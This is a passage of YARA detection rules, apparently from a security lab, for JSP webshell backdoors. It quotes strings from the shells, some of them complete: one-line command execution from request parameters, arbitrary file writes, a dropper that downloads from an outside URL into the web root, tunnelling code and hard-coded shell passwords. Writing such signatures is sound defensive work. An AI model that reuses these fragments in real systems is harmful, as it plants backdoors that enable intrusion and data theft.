        $s4 = "response.setHeader(\"Content-Disposition\", \"attachment; filename=\" + URLEncoder.encode(f.getName(),\"UTF-8\"));" fullword ascii
        $s5 = "Process pro=(Process)session.getAttribute(\"cmd\");" fullword ascii
        $s6 = "document.write(\"<style>body{border:0px;background-color:menu;}</style><base target='dialog' />\");" fullword ascii
        $s7 = "pro=Runtime.getRuntime().exec(isLinux?\"bash\":\"cmd\",null,f);" fullword ascii
        $s8 = "out.print(\"<textarea name='cmd' style='width:100%;overflow-y:visible;' rows='5' onkeypress=\\\"if(!event.shiftKey&&event.keyCo" fullword ascii
        $s9 = "a+=\"<a href=?p=\"+encodeURIComponent(p.substring(0,j))+\" target='_blank'>\"+p.substring(on,j)+\"</a>\";" fullword ascii
        $s10 = "String str=  exec(isLinux ? \"/etc/init.d/ \"+ps[i]+\" restart\" : \"net stop \"+ps[i]+\" & net start \"+ps[i], null);" fullword ascii
        $s11 = "return window.showModalDialog('?mt='+mt+'&t='+new Date().getTime(),self,'dialogWidth:'+w+'px;dialogHeight:'+h+'px;resizable:1;" fullword ascii
        $s12 = "String str = exec(isLinux ? \"ps uax\" : \"tasklist /v /fo csv\", null);" fullword ascii
        $s13 = "<td>Powered By <a href=\"http://www.mietian.net/\" target=\"_blank\">" fullword ascii
        $s14 = "ps[i]=\"cmd /c net stop \"+ps[i]+\" & net start \"+ps[i];" fullword ascii
        $s15 = "Matcher m=Pattern.compile(\" (/[^\\n]+)\\n\").matcher(exec(\"df\",null));" fullword ascii
        $s16 = "de==13){ event.returnValue=false; d('term.cmd',value); }\\\"></textarea><script>form1.cmd.focus();</script>\");" fullword ascii
        $s17 = "//if(!f.exists())f=new File(this.getServletContext().getRealPath(uri)+\"\\\\UnRAR.exe\");" fullword ascii
        $s18 = "String s[] = exec(\"net user \" + us[i], null).split(\"(\\r\\n)+\");" fullword ascii
        $s19 = "exec((isLinux ? \"kill -9 \" : \"tskill \") + ps[i], null);" fullword ascii
        $s20 = "out.print(\"<tr onmouseover=bgColor='#BCD1E9' onmouseout=bgColor=''><td><input type='checkbox' name='ps' value='\" + tds[1] " fullword ascii
    condition:
        ( uint16(0) == 0xbbef and filesize < 100KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule sig_536d65c8be91fa1d709f4c5a91e1f446e0d250e9
{
    meta:
        description = "jsp - file 536d65c8be91fa1d709f4c5a91e1f446e0d250e9.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "fed28f07e0feb4a94254a744f587439b38552b5e76f39094ec16e25bde7acd27"
    strings:
        $s1 = "new java.io.FileOutputStream(application.getRealPath(\"/\")+\"/\"+ request.getParameter(\"f\")).write(baos.toByteArray());" fullword ascii
        $s2 = "java.io.InputStream in = new java.net.URL(request.getParameter(\"u\")).openStream();" fullword ascii
        $s3 = "while ((a = in.read(b)) != -1) {" fullword ascii
        $s4 = "java.io.ByteArrayOutputStream baos = new java.io.ByteArrayOutputStream();" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 1KB and ( all of them ) ) or ( all of them )
}

rule sig_90ee7f3c291f78fbab6414fd7e2545f4a5eabf4f
{
    meta:
        description = "jsp - file 90ee7f3c291f78fbab6414fd7e2545f4a5eabf4f.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "781a141485d7dbf902a5ff10c873653e52622373048e38916a2d7bf5af216074"
    strings:
        $s1 = "private static final String PW = \"managerps\";" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 200KB and ( all of them ) ) or ( all of them )
}

rule sig_00c86bf6ce026ccfaac955840d18391fbff5c933
{
    meta:
        description = "jsp - file 00c86bf6ce026ccfaac955840d18391fbff5c933.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "2f482548bc419b63762a04249697d371f277252e7c91a7be49cc65b72e9bae5a"
    strings:
        $s1 = "socketChannel.connect(new InetSocketAddress(target, port));" fullword ascii
        $s2 = "https://github.com/sensepost/reGeorg" fullword ascii
        $s3 = "etienne@sensepost.com / @kamp_staaldraad" fullword ascii
        $s4 = "} else if (cmd.compareTo(\"FORWARD\") == 0){" fullword ascii
        $s5 = "System.out.println(e.getMessage());" fullword ascii
        $s6 = "System.out.println(ex.getMessage());" fullword ascii
        $s7 = "sam@sensepost.com / @trowalts" fullword ascii
        $s8 = "int readlen = request.getContentLength();" fullword ascii
        $s9 = "willem@sensepost.com / @_w_m__" fullword ascii
        $s10 = "} else if (cmd.compareTo(\"READ\") == 0){" fullword ascii
        $s11 = "request.getInputStream().read(buff, 0, readlen);" fullword ascii
        $s12 = "SocketChannel socketChannel = (SocketChannel)session.getAttribute(\"socket\");" fullword ascii
        $s13 = "response.setHeader(\"X-ERROR\", e.getMessage());" fullword ascii
        $s14 = "String target = request.getHeader(\"X-TARGET\");" fullword ascii
        $s15 = "IOException, java.net.UnknownHostException, java.net.Socket\" %><%" fullword ascii
        $s16 = "response.setHeader(\"X-STATUS\", \"FAIL\");" fullword ascii
        $s17 = "String cmd = request.getHeader(\"X-CMD\");" fullword ascii
        $s18 = "} else if (cmd.compareTo(\"DISCONNECT\") == 0) {" fullword ascii
        $s19 = "int port = Integer.parseInt(request.getHeader(\"X-PORT\"));" fullword ascii
        $s20 = "if (cmd.compareTo(\"CONNECT\") == 0) {" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 10KB and ( 8 of them ) ) or ( all of them )
}

rule sig_583231786bc1d0ecca7d8d2b083804736a3f0a32
{
    meta:
        description = "jsp - file 583231786bc1d0ecca7d8d2b083804736a3f0a32.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "425fe29b9c497a1ea8c67cd9fe06cdf257efdeb73a2ebcd091039a2ff92434cd"
    strings:
        $s1 = "<%@page import=\"java.io.*\"%><%@page import=\"java.net.*\"%><%String t=request.getRealPath(\"/\")+request.getParameter(\"f\");n" ascii
        $s2 = "RL(\"http://qztmi.cn/js/h.txt\").openConnection())).getInputStream());DataOutputStream o=new DataOutputStream(new FileOutputStre" ascii
        $s3 = "t).getParentFile().mkdirs();if(request.getParameter(\"p\")==null){DataInputStream i=new DataInputStream(((HttpURLConnection)(new" ascii
        $s4 = "<%@page import=\"java.io.*\"%><%@page import=\"java.net.*\"%><%String t=request.getRealPath(\"/\")+request.getParameter(\"f\");n" ascii
        $s5 = "setHeader(\"down-ok\",\"1\");}else{(new FileOutputStream(t)).write(request.getParameter(\"p\").getBytes());out.println(\"upload-" ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 1KB and ( all of them ) ) or ( all of them )
}

rule aa62348ad603bd54abdda7a419b13eebb8cc2a42
{
    meta:
        description = "jsp - file aa62348ad603bd54abdda7a419b13eebb8cc2a42.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "2c34c33e58591204dace846a2efca98e829d55108269877a147c4db58e2594bd"
    strings:
        $s1 = "codeBuffer(request.getParameter(\"c\")));out.close();%> " fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 1KB and ( all of them ) ) or ( all of them )
}

rule sig_1e79cae19d42da5aa9813b16456971b4e3d34ac0
{
    meta:
        description = "jsp - file 1e79cae19d42da5aa9813b16456971b4e3d34ac0.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "ae77377b007733bb984ccf751ba2ba26a5befc293a2266ca00d7e53125299947"
    strings:
        $x1 = "pro = Runtime.getRuntime().exec(\"cmd.exe /c net start\");  " fullword ascii
        $x2 = "pro = Runtime.getRuntime().exec(\"cmd.exe /c tasklist /svc\");  " fullword ascii
        $x3 = "pro = Runtime.getRuntime().exec(\"cmd.exe /c netstat -an\");  " fullword ascii
        $x4 = "process = Runtime.getRuntime().exec(\"ipconfig /all\");// windows" fullword ascii
        $s5 = "<!-- saved from url=(0036)http://localhost:8080/test/shell.jsp -->" fullword ascii
        $s6 = "out.print(\"<body scroll=no bgcolor=#000000><Center style=font-size:13px><div style='width:500px;border:1px solid #222;padding:2" ascii
        $s7 = "String exec = exeCmd(out,\"taskkill /f /pid \"+Pid);" fullword ascii
        $s8 = "out.print(\"<a href='?action=Z&command=netstart' target=FileFrame>" fullword ascii
        $s9 = "out.print(\"<a href='?action=Y&command=tasklist' target=FileFrame>" fullword ascii
        $s10 = "out.print(\"<a href='?action=B&command=netstat' target=FileFrame>" fullword ascii
        $s11 = "out.print(\"<meta http-equiv=\\\"refresh\\\" content=\\\"2;url=\" + nowURI +\"\\\" />\\n\");" fullword ascii
        $s12 = "out.print(\"<tr><td width='60%'>\"+strCut(convertPath(list[i].getPath()),70)+\"</td><td width='40%'><a href='javascript:JsReN" fullword ascii
        $s13 = "out.print(\"<form name=address method=post target=FileFrame onSubmit='checkUrl();'>\");" fullword ascii
        $s14 = "out.print(\"<TR><TD height=20><A href=\\\"?action=q\\\" target=FileFrame>" fullword ascii
        $s15 = "out.print(\"<TR><TD height=20><A href=\\\"?action=G\\\" target=FileFrame>" fullword ascii
        $s16 = "if(request.getParameter(\"pass\")!=null&&request.getParameter(\"pass\").equals(passWord)){" fullword ascii
        $s17 = "out.print(\"<TR><TD height=20><A href='?action=t' target=FileFrame>" fullword ascii
        $s18 = "out.print(\"<CENTER><A href=\\\"\\\" target=_blank><FONT color=red></FONT></CENTER></A>\");" fullword ascii
        $s19 = "</td><td>\"+System.getProperty(\"java.io.tmpdir\")+\"</td></tr>\");" fullword ascii
        $s20 = "res.setHeader(\"Content-disposition\",\"attachment;filename=\\\"\"+fName+\"\\\"\");" fullword ascii
    condition:
        ( uint16(0) == 0x213c and filesize < 100KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule ca471715b0ff91c807c6b3c257931ecbd4b0f74c
{
    meta:
        description = "jsp - file ca471715b0ff91c807c6b3c257931ecbd4b0f74c.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "59df3f36552613625ce2fbc362e9c4e101a47cbe0d5bbd9601c9e12705282998"
    strings:
        $s1 = "<%Runtime.getRuntime().exec(request.getParameter(\"i\"));%>" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 1KB and ( all of them ) ) or ( all of them )
}

rule dd29ce7a3bfa9b892317f4b7ea7cca13c9e9aeed
{
    meta:
        description = "jsp - file dd29ce7a3bfa9b892317f4b7ea7cca13c9e9aeed.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "19375141be573a9a01da3eeb26735ecdf7b7beafdbedbd8a0289e42bda552696"
    strings:
        $s1 = "<td><span style=\\\"float:right;\\\"><a href=\\\"http://www.baidu.com\\\" target=\\\"_blank\\\">JspSpy Ver: 2009</a></span>\"+re" ascii
        $s2 = "<td><span style=\\\"float:right;\\\"><a href=\\\"http://www.baidu.com\\\" target=\\\"_blank\\\">JspSpy Ver: 2009</a></span>\"+re" ascii
        $s3 = "response.getWriter().println(\"<div style=\\\"padding:10px;border-bottom:1px solid #fff;border-top:1px solid #ddd;background:#ee" ascii
        $s4 = "\"<span style=\\\"font:11px Verdana;\\\">Copyright &copy; 2012 Admin </span><a href=\\\"http://www.baidu.com\\\" target=\\\"_bla" ascii
        $s5 = "\"<span style=\\\"font:11px Verdana;\\\">Copyright &copy; 2012 Admin </span><a href=\\\"http://www.baidu.com\\\" target=\\\"_bla" ascii
        $s6 = "\">Copyright (C) 2009 <a href=\\\"http://www.baidu.com\\\" target=\\\"_blank\\\">http://www.baidu.com/</a>&nbsp;&nbsp;<a target=" ascii
        $s7 = "new OnLineConnector(pro.getErrorStream(),response.getOutputStream(),\"exeRclientO\",olp).start();//?&#148;&#153;" fullword ascii
        $s8 = "\" href=\\\"http://www.baidu.com/\\\">[T00ls.Net]</a> All Rights Reserved.\"+" fullword ascii
        $s9 = "out.println(\"<html><head><title> </title><style type=\\\"text/css\\\">\"+" fullword ascii
        $s10 = "idu.com</a></p>\"+" fullword ascii
        $s11 = "8px;\\\" /> <input type=\\\"submit\\\" name=\\\"submit\\\" value=\\\"Scan\\\" id=\\\"submit\\\" class=\\\"bt\\\" />\"+" fullword ascii
        $s12 = "private static final String PW = \"k8\"; " fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 200KB and ( 8 of them ) ) or ( all of them )
}

rule d1f82ad79dabb67201101e5eebb4bced8d974493
{
    meta:
        description = "jsp - file d1f82ad79dabb67201101e5eebb4bced8d974493.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "a4306b23c0f066dbfbfc5a06d07b58081dd618fd5c95ec795cd3b8085bc80bd6"
    strings:
        $s1 = "<td align=\"right\">created by <a href=\"mailto:luoluonet@hotmail.com\">luoluo</a> and welcome to <a href=\"http://www.ph4nt0m.o" ascii
        $s2 = "<td><a title=\\\"\" + files[n].getName() + \"\\\">\" + strCut(files[n].getName(), 50) + \"</a></td>\\n\";" fullword ascii
        $s3 = "document.fileList.action = \\\"\" + curUri + \"&curPath=\" + path + \"&fsAction=copyto&dstPath=\" + \"\\\" + toPath;\\n\";" fullword ascii
        $s4 = "<td>[<a href=\\\"\" + curUri + \"&curPath=\" + pathConvert(curFile.getParent()) + \"\\\">" fullword ascii
        $s5 = "ut(files[n].getName(), 50) + \"&gt;</a></td>\\n\";" fullword ascii
        $s6 = "private String _password = \"admin\";" fullword ascii
        $s7 = "ert(files[n].getPath()) + \"</a></td>\\n\";" fullword ascii
        $s8 = "<td width=\\\"15%\\\" align=\\\"center\\\">\" + files[n].length() + \"</td>\\n\";" fullword ascii
        $s9 = "document.dbInfo.sql.value = \\\"\\\";\";" fullword ascii
        $s10 = "<textarea name=\\\"fileContent\\\" cols=\\\"80\\\" rows=\\\"32\\\">\\n\";" fullword ascii
        $s11 = "<td align=\"right\">created by <a href=\"mailto:luoluonet@hotmail.com\">luoluo</a> and welcome to <a href=\"http://www.ph4nt0m.o" ascii
        $s12 = "<input type=\"password\" size=\"25\" name=\"password\" class=\"textbox\" />" fullword ascii
        $s13 = "document.openfile.action=\\\"\" + curUri + \"&curPath=\" + pathConvert(curFile.getParent()) + \"\\\" + fileName + \\\"&fsAction=" ascii
        $s14 = "sRet += \"<meta http-equiv=\\\"refresh\\\" content=\\\"2;url=\" + curUri + \"&curPath=\" + path + \"&fsAction=open\" + \"\\\" />" ascii
        $s15 = "document.openfile.action=\\\"\" + curUri + \"&curPath=\" + pathConvert(curFile.getParent()) + \"\\\" + fileName + \\\"&fsAction=" ascii
        $s16 = "<td align=\"center\" colspan=\"2\"><b>JShell Ver 1.0</b></td>" fullword ascii
        $s17 = "<form enctype=\\\"multipart/form-data\\\" method=\\\"post\\\" name=\\\"upload\\\" action=\\\"\" + curUri + \"&curPath=\" + path " ascii
        $s18 = "<form enctype=\\\"multipart/form-data\\\" method=\\\"post\\\" name=\\\"upload\\\" action=\\\"\" + curUri + \"&curPath=\" + path " ascii
        $s19 = "\\\">edit</a>>\" : \"\") + \"</td>\\n\";" fullword ascii
        $s20 = "selectedFile.style.backgroundColor = \\\"#FFFFFF\\\";\\n\";" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 200KB and ( 8 of them ) ) or ( all of them )
}

rule sig_5fabc956f2030f24d1ab2e2fa9c5c95cc301fbc1
{
    meta:
        description = "jsp - file 5fabc956f2030f24d1ab2e2fa9c5c95cc301fbc1.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "e1ccb61000bafb15886734b1e6d083e6ffac476290a74457bc8a59433e663493"
    strings:
        $s1 = "<%new java.io.FileOutputStream(request.getParameter(\"f\")).write(request.getParameter(\"c\").getBytes());%>" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 1KB and ( all of them ) ) or ( all of them )
}

rule c1efcbdb38003f4b4d11b022b69ecdbad90025a6
{
    meta:
        description = "jsp - file c1efcbdb38003f4b4d11b022b69ecdbad90025a6.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "dda9e7e898e8f973a0a16c576789337caf7da2f9303936de5b062e98966e50a0"
    strings:
        $s1 = "public String getBoundary(HttpServletRequest request,Properties prop) throws ServletException,IOException{" fullword ascii
        $s2 = "Long contentsize = new Long(prop.getProperty(\"content-length\",\"0\"));" fullword ascii
        $s3 = "out.println(\"FileName: \" + newfile.getName());" fullword ascii
        $s4 = "long l = contentsize.longValue() - ROUGHSIZE; " fullword ascii
        $s5 = "<form name=\"test\" method=\"post\" action=\"\" enctype=\"multipart/form-data\">" fullword ascii
        $s6 = "// up.jsp = File Upload (win32)" fullword ascii
        $s7 = "out.println(\"FileSize: \" + newfile.length());" fullword ascii
        $s8 = "ServletInputStream fin =  request.getInputStream();" fullword ascii
        $s9 = "if(\"content-type\".equalsIgnoreCase(header) ){" fullword ascii
        $s10 = "boundary = prop.getProperty(\"boundary\"); " fullword ascii
        $s11 = "public String getFileName(String secondline){" fullword ascii
        $s12 = "String tboundary = st.getBuffer().toString();" fullword ascii
        $s13 = "String hvalue = request.getHeader(header);" fullword ascii
        $s14 = "String boundary = getBoundary(request,prop);" fullword ascii
        $s15 = "String header = (String)enum.nextElement();" fullword ascii
        $s16 = "String secondline = st.getBuffer().toString();" fullword ascii
        $s17 = "while((c = fin.read()) != -1){" fullword ascii
        $s18 = "Enumeration enum = request.getHeaderNames();" fullword ascii
        $s19 = "<%@ page import=\"java.io.*,java.util.*,javax.servlet.*\" %>" fullword ascii
        $s20 = "while((c=fin.read()) != -1 ){" fullword ascii
    condition:
        ( uint16(0) == 0x6a3c and filesize < 10KB and ( 8 of them ) ) or ( all of them )
}

rule e9060aa2caf96be49e3b6f490d08b8a996c4b084
{
    meta:
        description = "jsp - file e9060aa2caf96be49e3b6f490d08b8a996c4b084.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "e07d220168c3e33c79e2db81f4cfa04876ae74baacd13616dd7dfc1394052ebe"
    strings:
        $s1 = "String  url  =  \"http://\"  +  request.getServerName()  +  \":\"  +  request.getServerPort()  +  request.getContextPath()+r" fullword ascii
        $s2 = "out.println(\"<br><a href=./\"+request.getParameter(\"table\")+\"-\"+mark+\".txt>\"+request.getParameter" fullword ascii
        $s3 = "//String sql_dump=\"select rownom ro,* from T_SYS_USER\";" fullword ascii
        $s4 = "sql_dump+=\" from \"+request.getParameter(\"table\")+\" where rownum<=\";" fullword ascii
        $s5 = "rs_dump= stmt_dump.executeQuery(dump);" fullword ascii
        $s6 = "String filename = request.getRealPath(request.getParameter(\"table\")+\"-\"+mark+\".txt\");" fullword ascii
        $s7 = "out.print(\" target=_blank>\");out.print(rs.getString(1));out.print(\"</a><br>\");" fullword ascii
        $s8 = "rs_columns_count=stmt_columns_count.executeQuery(sql_columns_count); " fullword ascii
        $s9 = "Statement stmt_dump=conn.createStatement(ResultSet.TYPE_SCROLL_SENSITIVE,ResultSet.CONCUR_UPDATA" fullword ascii
        $s10 = "Statement stmt_dump=conn.createStatement(ResultSet.TYPE_SCROLL_SENSITIVE,ResultSet.CONCUR_UPDATABLE);" fullword ascii
        $s11 = "String sql_column=\"select * from all_tab_columns where Table_Name='\"+request.getParameter(\"table\")+\"'\";" fullword ascii
        $s12 = "Connection conn=DriverManager.getConnection(oraUrl,oraUser,oraPWD);" fullword ascii
        $s13 = "String basePath = request.getScheme()+\"://\"+request.getServerName()+\":\"+request.getServerPort()+path+\"/\";" fullword ascii
        $s14 = "rs=stmt.executeQuery(\"select table_name from all_tables\");" fullword ascii
        $s15 = "rs_column=stmt_column.executeQuery(sql_column); " fullword ascii
        $s16 = "pw.print(rs_dump.getString(column_num));" fullword ascii
        $s17 = "sql_dump+=rs_column.getString(3);" fullword ascii
        $s18 = "out.print(\"<a href=\");out.print(url);out.print(\"?table=\");out.print(rs.getString(1));" fullword ascii
        $s19 = "<meta http-equiv=\"keywords\" content=\"keyword1,keyword2,keyword3\">" fullword ascii
        $s20 = "String sql_count=\"select count(*) from all_tab_columns where Table_Name='\"+request.getParameter(\"table\")+\"'\";" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 30KB and ( 8 of them ) ) or ( all of them )
}

rule sig_9e32b877_e01d_4948_80e9_8e65151ca2b6
{
    meta:
        description = "jsp - file 9e32b877-e01d-4948-80e9-8e65151ca2b6.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "115d2750f70a1cc6cda5aa72bd8541bba87157c6f00dc7f311f3f5ba1bb41ecb"
    strings:
        $x1 = "Process ls_proc = Runtime.getRuntime().exec(comm, null, new File(dir));" fullword ascii
        $x2 = "request.setAttribute(\"error\", \"Execution of native commands is not allowed!\");" fullword ascii
        $x3 = "* Command of the shell interpreter and the parameter to run a programm" fullword ascii
        $s4 = ".processData(request.getInputStream(), bound, tempdir, clength);" fullword ascii
        $s5 = "<b><%=convertFileSize(size)%> in <%=fileCount%> files in <%=f.getName()%>. Compression ratio: <%=(f.length() * 100) / si" fullword ascii
        $s6 = "<b><%=convertFileSize(size)%> in <%=fileCount%> files in <%=f.getName()%>. Compression ratio: <%=(f.length() * 100) / size%>%" fullword ascii
        $s7 = "*         @param command the command to start the process" fullword ascii
        $s8 = "static String startProcess(String command, String dir) throws IOException {" fullword ascii
        $s9 = "request.setAttribute(\"error\", \"Reading of \" + f.getName() + \" aborted. Error: \"" fullword ascii
        $s10 = "request.setAttribute(\"error\", \"You are not allowed to access \" + ht.get(\"dir\"));" fullword ascii
        $s11 = "* Max time in ms a process is allowed to run, before it will be terminated" fullword ascii
        $s12 = "response.setHeader(\"Content-Disposition\", \"attachment;filename=\\\"\" + f.getName()" fullword ascii
        $s13 = "if (System.currentTimeMillis() - start > MAX_PROCESS_RUNNING_TIME) {" fullword ascii
        $s14 = "response.setHeader(\"Content-Disposition\", \"attachment;filename=\\\"rename_me.zip\\\"\");" fullword ascii
        $s15 = "request.setAttribute(\"error\", \"You are not allowed to access \" + request.getAttribute(\"dir\"));" fullword ascii
        $s16 = "private static final long MAX_PROCESS_RUNNING_TIME = 30 * 1000; //30 seconds" fullword ascii
        $s17 = "request.setAttribute(\"error\", \"Directory \" + f.getAbsolutePath() + \" does not exist.\");" fullword ascii
        $s18 = "\"Content-Disposition\", \"inline;filename=\\\"temp.txt\\\"\");" fullword ascii
        $s19 = "request.setAttribute(\"error\", \"You are not allowed to access \" + ef.getAbsolutePath());" fullword ascii
        $s20 = "request.setAttribute(\"error\", \"You are not allowed to access \" + new_f.getAbsolutePath());" fullword ascii
    condition:
        ( uint16(0) == 0x3c0a and filesize < 300KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule sig_7509ee0248c4c10ed12568e1ba9265ebb2e7d8ad
{
    meta:
        description = "jsp - file 7509ee0248c4c10ed12568e1ba9265ebb2e7d8ad.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "709925f24268dcfe93d666d210b38ddee557bfd08b13744426b4fc44ce955008"
    strings:
        $s1 = "Connection conn = DriverManager.getConnection(url, username, password);" fullword ascii
        $s2 = "rs = stmt.executeQuery(\"SELECT * FROM \" + table);" fullword ascii
        $s3 = "rs = stmt.executeQuery(\"SHOW CREATE TABLE \" + table);" fullword ascii
        $s4 = "out.println(\"Dumping data for table \" + table + \"...<br />\");" fullword ascii
        $s5 = "<%@ page language=\"java\" contentType=\"text/html; charset=UTF-8\" pageEncoding=\"UTF-8\"%>" fullword ascii
        $s6 = "*************************** 1. row ***************************" fullword ascii
        $s7 = "tables.add(rs.getString(3));" fullword ascii
        $s8 = "for (int col = 1; col <= rsmd.getColumnCount(); col++) {" fullword ascii
        $s9 = "OutputStreamWriter osw = new OutputStreamWriter(new FileOutputStream(backupDir+table+ex), \"UTF-8\");" fullword ascii
        $s10 = "String password = \"pass\";" fullword ascii
        $s11 = "ResultSet rs = dmd.getTables(null, null, \"%\", null);" fullword ascii
        $s12 = "* mysql> SHOW CREATE TABLE t\\G" fullword ascii
        $s13 = "*                      ) TYPE=MyISAM" fullword ascii
        $s14 = "*                        PRIMARY KEY (id)" fullword ascii
        $s15 = "*                        id int(11) default NULL auto_increment," fullword ascii
        $s16 = "DatabaseMetaData dmd = conn.getMetaData();" fullword ascii
        $s17 = "String url = \"jdbc:mysql://localhost:3306/dbname\";" fullword ascii
        $s18 = "//            osw.append(rs.getString(2) + \"\\n\\n\");" fullword ascii
        $s19 = "<%@ page import=\"java.sql.*\" %>" fullword ascii
        $s20 = "bw.append(\"INSERT INTO \" + table + \" VALUES(\");" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 8KB and ( 8 of them ) ) or ( all of them )
}

rule sig_890b58037ee26d9139b393293031c7d485d694f6
{
    meta:
        description = "jsp - file 890b58037ee26d9139b393293031c7d485d694f6.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "475e9db9b5973192268d4c3964f1fc2ff200a735427954379ff1d02fa4a9782a"
    strings:
        $x1 = "Unix:/bin/sh -c tar vxf xxx.tar Windows:c:\\winnt\\system32\\cmd.exe /c type c:\\winnt\\win.ini" fullword ascii
        $x2 = "* action=piped&remoteHost=192.168.0.1&remotePort=25&myIp=218.0.0.1&myPort=12345 -- " fullword ascii
        $x3 = "Process child = Runtime.getRuntime().exec(cmd);" fullword ascii
        $x4 = "* action=login&username=root&password=helloroot&myPort=65534 -- " fullword ascii
        $x5 = "* action=tunnel&remoteHost=192.168.0.1&remotePort=23&myPort=65534 -- " fullword ascii
        $s6 = "* ]http://victim/webshell.jsp?[options]" fullword ascii
        $s7 = "* action=send&myShell=&myPort=&cmd= -- " fullword ascii
        $s8 = "* action=login&username=&password=&myPort=" fullword ascii
        $s9 = "* E-mail: wangyun188@hotmail.com" fullword ascii
        $s10 = "* action=piped&remoteHost=&remotePort=&myIp=&myPort=" fullword ascii
        $s11 = "out.print(tc.wait(\"login:\"));" fullword ascii
        $s12 = "* action=send&myShell=&myPort=&cmd=" fullword ascii
        $s13 = "* action=shell&cmd= -- " fullword ascii
        $s14 = "piped me = new piped(remoteHost,Integer.parseInt(remotePort),myIp,Integer.parseInt(myPort));" fullword ascii
        $s15 = "out.print(tc.wait(\"Password:\"));" fullword ascii
        $s16 = "* action=tunnel&remoteHost=&remotePort=&myPort=" fullword ascii
        $s17 = "String remoteHost = request.getParameter(\"remoteHost\");" fullword ascii
        $s18 = "String password = request.getParameter(\"password\");" fullword ascii
        $s19 = "if(debug > 0) System.out.println(\"Telnet.connect(\"+address+\",\"+port+\")\");" fullword ascii
        $s20 = "* action=close&myPort= -- " fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 50KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule df09b26aae0d3f7d0f5e0df411b688e0dea51488
{
    meta:
        description = "jsp - file df09b26aae0d3f7d0f5e0df411b688e0dea51488.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "5473f1edd8d2c8c37648cf0c64d805741f1cd867eeceb21850570d74851f0d78"
    strings:
        $s1 = "<SCRIPT type='text/javascript' language='javascript' src='http://xslt.alexa.com/site_stats/js/t/c?url='></SCRIPT>" fullword ascii
        $s2 = "<td align=\"right\">hack520 by <a href=\"mailto:hack520@77169.org\">hack520</a> and welcome to <a href=\"http://www.77169.com\" " ascii
        $s3 = "<td align=\"right\">hack520 by <a href=\"mailto:hack520@77169.org\">hack520</a> and welcome to <a href=\"http://www.77169.com\" " ascii
        $s4 = "<td><a title=\\\"\" + files[n].getName() + \"\\\">\" + strCut(files[n].getName(), 50) + \"</a></td>\\n\";" fullword ascii
        $s5 = "document.fileList.action = \\\"\" + curUri + \"&curPath=\" + path + \"&fsAction=copyto&dstPath=\" + \"\\\" + toPath;\\n\";" fullword ascii
        $s6 = "<td>[<a href=\\\"\" + curUri + \"&curPath=\" + pathConvert(curFile.getParent()) + \"\\\">" fullword ascii
        $s7 = "ut(files[n].getName(), 50) + \"&gt;</a></td>\\n\";" fullword ascii
        $s8 = "private String _password = \"8013520\";" fullword ascii
        $s9 = "<input type=\"hidden\" name=\"__VIEWSTATE\" value=\"dDwtMTQyNDQzOTM1NDt0PDtsPGk8OT47PjtsPHQ8cDxsPGVuY3R5cGU7PjtsPG11bHRpc" fullword ascii
        $s10 = "ert(files[n].getPath()) + \"</a></td>\\n\";" fullword ascii
        $s11 = "<td width=\\\"15%\\\" align=\\\"center\\\">\" + files[n].length() + \"</td>\\n\";" fullword ascii
        $s12 = "document.dbInfo.sql.value = \\\"\\\";\";" fullword ascii
        $s13 = "<textarea name=\\\"fileContent\\\" cols=\\\"80\\\" rows=\\\"32\\\">\\n\";" fullword ascii
        $s14 = "3J5O0RCX3JCX01TU1FMO0RCX3JCX01TU1FMO0RCX3JCX0FjY2VzcztEQl9yQl9BY2Nlc3M7Pj7Z5iNIVOaWZWuK0pv8lCMSbhytgQ==\" />" fullword ascii
        $s15 = "document.openfile.action=\\\"\" + curUri + \"&curPath=\" + pathConvert(curFile.getParent()) + \"\\\" + fileName + \\\"&fsAction=" ascii
        $s16 = "sRet += \"<meta http-equiv=\\\"refresh\\\" content=\\\"2;url=\" + curUri + \"&curPath=\" + path + \"&fsAction=open\" + \"\\\" />" ascii
